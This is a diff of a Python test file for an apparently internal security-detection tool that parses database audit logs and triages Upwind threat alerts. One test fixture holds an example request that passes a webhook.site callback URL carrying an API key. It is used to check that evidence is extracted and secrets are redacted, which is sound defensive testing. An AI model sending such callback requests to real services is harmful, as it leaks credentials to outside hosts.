@@ -44,7 +44,7 @@ def test_passwords_are_redacted(sql):
 
 
 def test_statement_and_cluster_are_parsed_from_the_audit_line():
-    line = ("1760848800123,prod-website-services-0,root,10.219.47.227,758600,56373452,QUERY,ai_news,"
+    line = ("1760848800123,prod-website-services-0,root,10.0.1.227,758600,56373452,QUERY,ai_news,"
             "'CREATE USER \\'ai_news_user\\'@\\'%\\' IDENTIFIED BY \\'pw,with,commas\\' REQUIRE SSL',0")
     sql = RDS.statement(line)
     assert sql.startswith("CREATE USER 'ai_news_user'") and "REQUIRE SSL" in sql
@@ -52,7 +52,7 @@ def test_statement_and_cluster_are_parsed_from_the_audit_line():
     assert RDS.cluster_of("/aws/rds/cluster/prod-loan-service/audit") == "prod-loan-service"
 
 
-def _dcl_row(stmt, user="root", client="10.219.95.112"):
+def _dcl_row(stmt, user="root", client="10.0.1.112"):
     return {"log_group": "/aws/rds/cluster/prod-trade-preset-service/audit", "dbuser": user, "client": client,
             "n": "2", "first": "2026-10-16T14:05:00Z",
             "sample": json.dumps([f"1,srv,{user},{client},1,1,QUERY,db,'{stmt}',0"])}
@@ -65,7 +65,7 @@ def test_account_changes_medium_strong_grants_high_and_secret_free():
     ])
     assert [x["severity"] for x in f] == ["medium", "high"]
     assert "hunter2" not in json.dumps(f)
-    assert f[0]["indicator"].startswith("account_change|prod-trade-preset-service|root|10.219.95.112|2026-10-16")
+    assert f[0]["indicator"].startswith("account_change|prod-trade-preset-service|root|10.0.1.112|2026-10-16")
 
 
 def test_destructive_only_new_pairs_and_drop_database_always():
@@ -83,7 +83,7 @@ def test_destructive_only_new_pairs_and_drop_database_always():
 
 
 def test_wrong_password_new_user_medium_guessed_high_chronic_quiet():
-    win = [{"log_group": "/aws/rds/cluster/c1/audit", "dbuser": "root", "client": "10.219.1.1", "fails": "1", "ok": "3"},
+    win = [{"log_group": "/aws/rds/cluster/c1/audit", "dbuser": "root", "client": "10.0.1.1", "fails": "1", "ok": "3"},
            {"log_group": "/aws/rds/cluster/c2/audit", "dbuser": "cch_user", "client": "10.193.9.9", "fails": "13", "ok": "0"},
            {"log_group": "/aws/rds/cluster/c3/audit", "dbuser": "svc", "client": "10.5.5.5", "fails": "4", "ok": "2"}]
     hist = [{"log_group": "/aws/rds/cluster/c2/audit", "dbuser": "cch_user", "client": "10.193.1.1"},
@@ -207,3 +207,125 @@ def test_unreachable_victorialogs_is_an_error_not_an_empty_answer(monkeypatch):
     monkeypatch.setattr("shadow_hunter.clients.victorialogs.VictoriaLogsClient", _C)
     r = asyncio.run(HV.hunt_vlogs(source="edge", ip="1.2.3.4"))
     assert "unavailable" in r["error"] and r["rows"] == []
+
+
+def test_ironwatch_weekly_window_needs_title_host_and_saturday_slot():
+    from shadow_hunter.detectors.upwind import UpwindThreatsDetector, ironwatch_window
+    def r(title="Login Banner Inspection", host="UAT-KAMBALA-GRPC", t="2026-11-07T20:31:16.747+00:00"):
+        return {"title": title, "first_seen": t, "severity": "HIGH", "category": "FILE_EVENTS",
+                "resource": {"name": host}}
+    assert ironwatch_window(r())
+    assert ironwatch_window(r(title="Local Group Database Inspection", host="KAMBALA-OMS-UAT"))
+    assert not ironwatch_window(r(t="2026-11-07T19:31:00+00:00"))      # wrong hour
+    assert not ironwatch_window(r(t="2026-11-08T20:31:00+00:00"))      # Sunday
+    assert not ironwatch_window(r(host="prod-kambala-oms"))             # host not in the set
+    assert not ironwatch_window(r(title="Bash History Read by Unexpected Process"))
+    f = UpwindThreatsDetector().to_findings([r()])[0]
+    assert f["allowlisted_by_rule"] == "ironwatch-weekly-cis"
+    g = UpwindThreatsDetector().to_findings([r(host="dam-0201")])[0]
+    assert g["allowlisted_by_rule"] == ""
+
+
+def test_annotate_keeps_a_detector_suppression():
+    from pathlib import Path
+    from shadow_hunter.allowlist import AllowlistEngine
+    eng = AllowlistEngine.load(Path(__file__).parent / "allowlist" / "rules.yaml")
+    out = eng.annotate([{"detector": "upwind_threats", "indicator": "x|y|2026-11-07", "raw": {},
+                         "allowlisted_by_rule": "ironwatch-weekly-cis"}])
+    assert out[0]["allowlisted_by_rule"] == "ironwatch-weekly-cis"
+
+
+def test_argo_ci_package_repo_needs_title_and_argo_launch_of_that_ip():
+    import asyncio
+    from shadow_hunter.detectors import upwind as U
+
+    def r(title="Package repository configuration modification", host="ip-10-193-85-69.ap-south-1.compute.internal",
+          t="2026-11-13T10:39:48.198+00:00"):
+        return {"title": title, "first_seen": t, "severity": "HIGH", "category": "FILE_EVENTS",
+                "resource": {"name": host}}
+    assert U.node_ip("ip-10-193-85-69.ap-south-1.compute.internal") == "10.193.85.69"
+    assert U.node_ip("iatlas-publisher01") == ""
+    # 13 Nov replay rows: argo launch 08:26, then an older prod launch of the same IP the day before
+    launches = [{"At": "2026-11-13T08:26:08Z", "Ip": "10.193.85.69", "Role": "argo-cluster-karpenter"},
+                {"At": "2026-11-12T18:07:03Z", "Ip": "10.193.85.69", "Role": "prod-karpenter"}]
+    a = r(); U.attach_ci_launch([a], launches)
+    assert a["ci_launch"]["role"] == "argo-cluster-karpenter" and U.argo_ci_node(a)
+    assert U.UpwindThreatsDetector().to_findings([a])[0]["allowlisted_by_rule"] == "argo-ci-package-repo"
+    # the last launch before the event was prod's: report
+    b = r(t="2026-11-13T08:00:00+00:00"); U.attach_ci_launch([b], launches)
+    assert b["ci_launch"]["role"] == "prod-karpenter" and not U.argo_ci_node(b)
+    # a launch AFTER the event never counts; too old an argo launch does not either
+    c = r(t="2026-11-12T10:00:00+00:00"); U.attach_ci_launch([c], launches)
+    assert "ci_launch" not in c and not U.argo_ci_node(c)
+    d = r(t="2026-11-14T09:00:00+00:00"); U.attach_ci_launch([d], launches)
+    assert not U.argo_ci_node(d)
+    # other titles on an argo node, and no CloudTrail proof, still report
+    e = r(title="Attacker Tooling Installed via Package Manager in a AWS host"); U.attach_ci_launch([e], launches)
+    assert not U.argo_ci_node(e)
+    assert U.UpwindThreatsDetector().to_findings([r()])[0]["allowlisted_by_rule"] == ""
+    # a group is suppressed only if every event in it is proven
+    assert U.UpwindThreatsDetector().to_findings([a, r(t="2026-11-13T10:40:00+00:00")])[0]["allowlisted_by_rule"] == ""
+    q = U.ci_launch_kql(["10.193.85.69"], U._ts("2026-11-12T10:00:00Z"), U._ts("2026-11-13T11:00:00Z"))
+    assert '"RunInstances"' in q and "UserIdentityArn" in q and "assumed-role/([^/]+)/" in q
+
+    # a failed CloudTrail lookup suppresses nothing
+    class Boom:
+        async def query(self, *a, **k):
+            raise RuntimeError("down")
+    import shadow_hunter.clients as Cl
+    orig = Cl.SentinelLogsClient
+    Cl.SentinelLogsClient = Boom
+    try:
+        rows = [r()]
+        asyncio.run(U.UpwindThreatsDetector._add_ci_launches(rows))
+        assert "ci_launch" not in rows[0] and not U.argo_ci_node(rows[0])
+    finally:
+        Cl.SentinelLogsClient = orig
+
+
+def _callback_detection():
+    import json as J
+    log = {"labels": {"http.method": "GET", "http.status-code": "200", "http.host": "service-uat.example.com",
+                      "http.uri": "/app/firewall/check/?&url=https%3A%2F%2Fwebhook.site%2Fabc%3Fapi_key%3Dsupersecret99",
+                      "cf-connecting-ip": "203.0.113.7", "src.comm": "wrk:worker_0", "flowDataSource": "tc",
+                      "src.container_id": "06a34cb2"},
+           "srcIp": "172.69.94.19", "destPort": 443, "timestamp": "2026-11-23T09:33:12Z"}
+    dup = dict(log, timestamp="2026-11-23T09:34:00Z")
+    return {"id": "uwnd-1", "triggers": [{"events": [{"rawLog": J.dumps(log)}, {"rawLog": J.dumps(dup)},
+                                                     {"rawLog": "not json"}]}]}
+
+
+def test_upwind_evidence_names_the_request_and_client_and_drops_noise():
+    from shadow_hunter.detectors import upwind as U
+    ev = U.evidence_from(_callback_detection())
+    assert len(ev) == 2                                   # the repeat at another time is one event
+    e = ev[0]
+    assert e["http.uri"].startswith("/app/firewall/check/?&url=https://webhook.site/abc")
+    assert "supersecret99" not in e["http.uri"]           # secrets redacted
+    assert e["cf-connecting-ip"] == "203.0.113.7" and "flowDataSource" not in e and "src.container_id" not in e
+    line = U.evidence_line(ev)
+    assert line.startswith("GET 200 service-uat.example.com/app/firewall/check/") and line.endswith("from 203.0.113.7")
+
+
+def test_upwind_finding_carries_evidence_first_and_a_seen_line():
+    from shadow_hunter.detectors import upwind as U
+    row = {"_id": "uwnd-1", "title": "Outbound Connection to a Callback Receiver", "severity": "MEDIUM",
+           "category": "NETWORK", "kind": "event", "first_seen": "2026-11-23T09:36:27Z",
+           "resource": {"name": "uplink-service-java-server"}}
+    async def fetch(i):
+        assert i == "uwnd-1"
+        return _callback_detection()
+    asyncio.run(U.UpwindThreatsDetector._add_evidence([row], fetch=fetch))
+    f = U.UpwindThreatsDetector().to_findings([row])[0]
+    assert list(f["raw"])[0] == "evidence" and f["raw"]["evidence"][0]["http.method"] == "GET"
+    assert "seen: GET 200 service-uat.example.com/app/firewall/check/" in f["summary"]
+
+
+def test_upwind_evidence_lookup_failure_changes_nothing():
+    from shadow_hunter.detectors import upwind as U
+    row = {"_id": "uwd-9", "title": "x", "severity": "HIGH", "first_seen": "2026-11-23T09:00:00Z", "resource": {"name": "h"}}
+    async def boom(i):
+        raise RuntimeError("401")
+    asyncio.run(U.UpwindThreatsDetector._add_evidence([row], fetch=boom))
+    f = U.UpwindThreatsDetector().to_findings([row])[0]
+    assert "evidence" not in row and f["raw"]["evidence"] == [] and "seen:" not in f["summary"]
